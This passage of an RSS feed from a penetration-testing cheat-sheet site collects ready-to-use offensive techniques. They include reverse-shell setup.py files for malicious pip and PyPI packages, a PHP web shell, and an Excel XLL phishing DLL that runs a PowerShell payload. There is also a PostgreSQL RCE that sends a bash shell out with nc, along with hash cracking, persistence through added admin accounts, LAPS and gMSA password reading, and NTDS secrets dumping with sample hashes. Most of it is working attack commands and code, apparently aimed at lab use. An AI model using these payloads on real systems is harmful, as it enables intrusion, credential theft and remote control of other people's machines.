      <description>Convert file to hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null john hashcat # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
    </item>
    <item>
      <title>Persistence</title>
      <link>https://tldrbins.github.io/persistence/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/persistence/</guid>
      <description>Add local user # Create new user net user &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net user test Test1234!@ /add The command completed successfully. # Add user to admin group net localgroup Administrators &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net localgroup administrators test /add The command completed successfully. # Add user to remote desktop group net localgroup &amp;#34;Remote Desktop Users&amp;#34; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; /add PS C:\WINDOWS\system32&amp;gt; net localgroup &amp;#34;remote desktop users&amp;#34; test /add The command completed successfully.</description>
    </item>
    <item>
      <title>Phishing</title>
      <link>https://tldrbins.github.io/phishing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/phishing/</guid>
      <description>lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
    </item>
    <item>
      <title>PHP Command Shell</title>
      <link>https://tldrbins.github.io/php_cmd_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
      <description>PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
    </item>
    <item>
      <title>pip</title>
      <link>https://tldrbins.github.io/pip/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/pip/</guid>
      <description>SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup( cmdclass={ &amp;#34;install&amp;#34;: Exploit } ) 2. Exploit # Run sudo pip install . </description>
    </item>
    <item>
      <title>POP3</title>
      <link>https://tldrbins.github.io/pop3/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/pop3/</guid>
      <description>Basic # Connect to POP3 mail server telnet &amp;lt;TARGET&amp;gt; 110 # Send cmd after +OK USER &amp;lt;USER&amp;gt; PASS &amp;lt;PASSWORD&amp;gt; # List all mails LIST # Retrieve mail #1 RETR 1 # Exit Ctrl + ], then quit </description>
    </item>
    <item>
      <title>Port Knocking</title>
      <link>https://tldrbins.github.io/port_knocking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/port_knocking/</guid>
      <description>knockd config location # Find knock sequence cat /etc/knockd.conf TCP UDP # For example, sequence = 123, 456, 789 for i in 123 456 789; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i &amp;lt;TARGET&amp;gt; &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; # UDP port knocking for i in 123 456 789; do sudo nmap -Pn -sU --host-timeout 100 --max-retries 0 -p $i &amp;lt;TARGET&amp;gt; &amp;gt;/dev/null; done; ssh -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
    </item>
    <item>
      <title>Postgresql</title>
      <link>https://tldrbins.github.io/postgresql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/postgresql/</guid>
      <description>Connect psql -h 127.0.0.1 -U &amp;lt;USER&amp;gt; -p 5432 -d &amp;lt;DB_NAME&amp;gt; psql &amp;#39;postgresql://&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@localhost:5432/&amp;lt;DB_NAME&amp;gt;&amp;#39; Basic # Show databases \list # Use database \connect &amp;lt;DB_NAME&amp;gt; # Show tables in current database \dt # Dump data from table select * from &amp;lt;TABLE_NAME&amp;gt;; # Insert data into table (e.g) insert into &amp;lt;TABLE_NAME&amp;gt; (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Write text copy (select &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39;) to &amp;#39;/var/lib/postgresql/.profile&amp;#39;; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; &amp;amp;&amp;#39; </description>
    </item>
    <item>
      <title>Pypi</title>
      <link>https://tldrbins.github.io/pypi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/pypi/</guid>
      <description>Abuse #1: Remote Pypi Server 1. Create files mkdir evil_package mkdir evil_package/evil_package cd evil_package touch README.md touch evil_package/__init__.py touch setup.cfg touch setup.py 2. Replace setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;&amp;lt;LOCAL_IP&amp;gt;&amp;#34;,&amp;lt;LOCAL_PORT&amp;gt;)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call([&amp;#34;/bin/sh&amp;#34;, &amp;#34;-i&amp;#34;]) setup(name=&amp;#34;evil_package&amp;#34;, version=&amp;#34;1.0.0&amp;#34;, description=&amp;#34;Evil Package&amp;#34;, author=&amp;#34;user&amp;#34;, author_email=&amp;#34;user@&amp;lt;DOMAIN&amp;gt;&amp;#34;, url=&amp;#34;http://&amp;lt;DOMAIN&amp;gt;&amp;#34;, license=&amp;#34;MIT&amp;#34;, zip_safe=False, cmdclass={&amp;#34;install&amp;#34;: Exploit}) 3.</description>
    </item>
    <item>
      <title>Python Decompile</title>
      <link>https://tldrbins.github.io/python_decompile/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/python_decompile/</guid>
      <description>Tools pyinstxtractor uncompyle6 pycdc # Unpack pyinstaller packed binary pyinstxtractor &amp;lt;FILE&amp;gt; # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 &amp;lt;PYC_FILE&amp;gt; # Install git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check # Run ./pycdc &amp;lt;PYC_FILE&amp;gt; Ref: pycdc</description>
    </item>
    <item>
      <title>rbash</title>
      <link>https://tldrbins.github.io/rbash/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbash/</guid>
      <description>Abuse #1: tar to rbash Escape # Before enter rbash echo $PATH # Enter rbash su &amp;lt;USER&amp;gt; - # rbash escape using tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash # Paste the above $PATH (e.g.) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>RBCD Attack Linux Windows 0. Check machine account quota nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M maq $ nxc ldap example.com -u &amp;#39;test.user&amp;#39; -p &amp;#39;Test1234&amp;#39; -M maq SMB 10.10.11.10 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False) LDAP 10.10.11.10 389 DC [+] example.com\test.user:Test1234 MAQ 10.10.11.10 389 DC [*] Getting the MachineAccountQuota MAQ 10.10.11.10 389 DC MachineAccountQuota: 10 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;&amp;lt;COMPUTER_PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; $ impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;Test1234&amp;#39; -dc-ip 10.</description>
    </item>
    <item>
      <title>RDP</title>
      <link>https://tldrbins.github.io/rdp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rdp/</guid>
      <description>Enable RDP # Enable Terminal Server Set-ItemProperty -Path &amp;#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&amp;#39; -Name &amp;#39;fDenyTSConnections&amp;#39; -Value 0 # Allow Inbound Traffic netsh advfirewall firewall add rule name=&amp;#34;Open Port 3389 IN&amp;#34; dir=in action=allow protocol=TCP localport=3389 xfreerdp remmina xfreerdp /u:&amp;#39;&amp;lt;USER&amp;gt;&amp;#39; /p:&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; /d:&amp;lt;DOMAIN&amp;gt; /v:&amp;lt;TARGET&amp;gt; /smart-sizing:1400x1080 remmina Fix ERRCONNECT_TLS_CONNECT_FAILED Advanced -&amp;gt; TLS Security Level -&amp;gt; 0 </description>
    </item>
    <item>
      <title>ReadGMSAPassword</title>
      <link>https://tldrbins.github.io/readgmsapassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
      <description>Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -l &amp;lt;DC&amp;gt; -d &amp;lt;DOMAIN&amp;gt; $ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: &amp;gt; DC$ &amp;gt; itsupport svc_int$:::745bd2c68dfc101a74f48d87027c7dc6 svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3 Ref: gMSADumper&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get object &amp;#39;&amp;lt;TARGET_OBJECT&amp;gt;&amp;#39; --attr msDS-ManagedPassword $ python3 bloodyAD.py -d intelligence.htb -u ted.graves -p &amp;#39;Mr.</description>
    </item>
    <item>
      <title>ReadLAPSPassword</title>
      <link>https://tldrbins.github.io/readlapspassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readlapspassword/</guid>
      <description>Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b &amp;#39;DC=LicorDeBellota,DC=HTB&amp;#39; -x -D bob@LicorDeBellota.htb -w &amp;#39;Test1234!@&amp;#39; &amp;#39;(ms-MCS-AdmPwd=*)&amp;#39; ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base &amp;lt;DC=LicorDeBellota,DC=HTB&amp;gt; with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.</description>
    </item>
    <item>
      <title>Redis</title>
      <link>https://tldrbins.github.io/redis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/redis/</guid>
      <description>Basic # Connect redis-cli -h 127.0.0.1 # Provide password auth &amp;lt;PASSWORD&amp;gt; # List current keys keys * # Add key incr key # Get key value get key Abuse #1: Arbitrary write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/&amp;lt;USER&amp;gt;/.</description>
    </item>
    <item>
      <title>Retrieve Flask Debug Pin</title>
      <link>https://tldrbins.github.io/retrieve_flask_debug_pin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/retrieve_flask_debug_pin/</guid>
      <description>Retrieve Flask Debug Pin 1. Get user cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) $ cat /proc/self/environ LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data ...[SNIP]... $ cat /proc/self/environ | grep -aE (&amp;#39;USER&amp;#39;|&amp;#39;LOGNAME&amp;#39;) LOGNAME=www-data USER=www-data 2. Get full path of the application +------------------------------+ | Get from Traceback debug log | +------------------------------+ Traceback (most recent call last) File &amp;#34;/app/venv/lib/python3.10/site-packages/flask/app.py&amp;#34;, line 2528, in wsgi_app response = self.handle_exception(e) ...[SNIP]... 3. Get MAC address cat /sys/class/net/eth0/address $ cat /sys/class/net/eth0/address 00:50:56:b9:2e:50 # Convert to int python3 -c &amp;#34;print(int(&amp;#39;&amp;lt;MAC_ADDRESS&amp;gt;&amp;#39;.</description>
    </item>
    <item>
      <title>RPC</title>
      <link>https://tldrbins.github.io/rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rpc/</guid>
      <description>Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N &amp;lt;TARGET&amp;gt; $ rpcclient -U &amp;#39;&amp;#39; -N 10.10.10.172 rpcclient $&amp;gt; # Connect with creds rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; # Inline execute command rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo rpcclient $&amp;gt; querydispinfo index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2 Name: AAD_987d7f2f57d2 Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</description>
    </item>
    <item>
      <title>rsync</title>
      <link>https://tldrbins.github.io/rsync/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rsync/</guid>
      <description>Basic Commands # List directory (&amp;#39;/&amp;#39;) rsync --list-only -a rsync://&amp;lt;TARGET&amp;gt;/ # List directory (&amp;#39;/&amp;#39;) with ipv6 rsync --list-only -a rsync://[&amp;lt;TARGET_IPV6&amp;gt;]:8730/ # List a file rsync --list-only -a rsync://&amp;lt;TARGET&amp;gt;/etc/passwd # List files (wildcard) rsync --list-only -a rsync://&amp;lt;TARGET&amp;gt;/etc/rsync* # Get a file rsync -a rsync://&amp;lt;TARGET&amp;gt;/etc/passwd . # Get files (wildcard) rsync -a rsync://&amp;lt;TARGET&amp;gt;/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;; rsync -aR .ssh/ rsync://&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;/home_user/ Bruteforce rsync password # Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.</description>
    </item>
    <item>
      <title>Runas</title>
      <link>https://tldrbins.github.io/runas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/runas/</guid>
      <description>RunasCS .\RunasCs.exe &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; -l &amp;lt;LOGON_TYPE&amp;gt; # Or .\RunasCs.exe &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --bypass-uac &amp;#34;&amp;lt;CMD&amp;gt;&amp;#34; -l &amp;lt;LOGON_TYPE&amp;gt; 2 Interactive 3 Network 4 Batch 5 Service 7 Unlock 8 NetworkCleartext 9 NewCredentials 10 RemoteInteractive 11 CachedInteractive Create credential object Method #1 Method #2 $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential($username, $password) $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.</description>
    </item>
    <item>
      <title>Scheduled tasks</title>
      <link>https://tldrbins.github.io/scheduled_tasks_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/scheduled_tasks_windows/</guid>
      <description>Check scheduled tasks Windows schtasks /query *Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; schtasks /query Folder: \ TaskName Next Run Time Status ======================================== ====================== =============== CleanUpDownloads N/A Ready CreateExplorerShellUnelevatedTask N/A Ready fix_vm N/A Ready OneDriveUpdate N/A Running User_Feed_Synchronization-{0041D634-0AC8 9/25/2024 12:48:00 AM Ready User_Feed_Synchronization-{12517E1A-613E 9/24/2024 6:58:48 PM Ready ...[SNIP]... # List details schtasks /TN &amp;#39;\&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt;&amp;#39; /FO LIST /V *Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; schtasks /TN \OneDriveUpdate /FO LIST /V Folder: \ HostName: DC TaskName: \OneDriveUpdate Next Run Time: N/A Status: Running Logon Mode: Interactive only Last Run Time: 9/24/2024 6:12:00 PM Last Result: 267009 Author: HOSPITAL\Administrator Task To Run: powershell.</description>
    </item>
    <item>
      <title>Searchsploit</title>
      <link>https://tldrbins.github.io/searchsploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/searchsploit/</guid>
      <description>searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 $ searchsploit samba 3.0 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 (OSX) - &amp;#39;lsa_io_trans_names&amp;#39; Heap Overflow (Metasploit) | osx/remote/16875.rb Samba 3.0.10 &amp;lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 &amp;lt; 3.0.25rc3 - &amp;#39;Username&amp;#39; map script&amp;#39; Command Execution (Metasploit) | unix/remote/16320.rb Samba 3.0.21 &amp;lt; 3.0.24 - LSA trans names Heap Overflow (Metasploit) | linux/remote/9950.</description>
    </item>
    <item>
      <title>SeBackupPrivilege/SeRestorePrivilege</title>
      <link>https://tldrbins.github.io/sebackupprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;#39;&amp;lt;TARGET_FILE_PATH&amp;gt;&amp;#39; &amp;#39;C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt;&amp;#39; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll&#xA;Abuse #3: Diskshadow 1. Create a .dsh File set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
    </item>
    <item>
      <title>secretsdump</title>
      <link>https://tldrbins.github.io/secretsdump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secretsdump/</guid>
      <description>Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite&#xA;With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL $ impacket-secretsdump -ntds ntds.dit -system system LOCAL Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d::: .</description>
    </item>
    <item>
      <title>Secure String</title>
      <link>https://tldrbins.github.io/secure_string/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secure_string/</guid>
      <description>Decrypt secure string Windows $s = cat pass.xml PS C:\programdata&amp;gt; $s = &amp;#34;01000000d0 ...[SNIP]... e63b3f24ec&amp;#34; $ss = Convertto-securestring -string $s PS C:\programdata&amp;gt; $ss = Convertto-securestring -string $s $ss = Convertto-securestring -string $s # Decrypt (New-Object System.Management.Automation.PSCredential &amp;#39;N/A&amp;#39;, $ss).GetNetworkCredential().Password PS C:\programdata&amp;gt; (New-Object System.Management.Automation.PSCredential &amp;#39;N/A&amp;#39;, $ss).GetNetworkCredential().Password (New-Object System.Management.Automation.PSCredential &amp;#39;N/A&amp;#39;, $ss).GetNetworkCredential().Password AhXpFsOusi ...[SNIP]... 0LxlUqc0Y= # Or save as cred $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;&amp;lt;USER&amp;gt;&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
    </item>
    <item>
      <title>SeDebugPrivilege</title>
      <link>https://tldrbins.github.io/sedebugprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
      <description>Tools Metasploit psgetsys.ps1 # Inside meterpreter ps winlogon # Explorer.exe is a good candidate migrate &amp;lt;PID&amp;gt; # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: psgetsys</description>
    </item>
    <item>
      <title>SeImpresonate</title>
      <link>https://tldrbins.github.io/seimpresonate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seimpresonate/</guid>
      <description>Abuse #1: Recover SeImpresonate .\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#34; Ref: FullPower&#xA;Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
    </item>
    <item>
      <title>SeLoadDriverPrivilege</title>
      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
    </item>
    <item>
      <title>Shadow Hash Cracking</title>
      <link>https://tldrbins.github.io/shadow_hash_cracking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/shadow_hash_cracking/</guid>
      <description>Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt &amp;gt; unshadowed.txt john hashcat john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user </description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://tldrbins.github.io/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/silver_ticket/</guid>
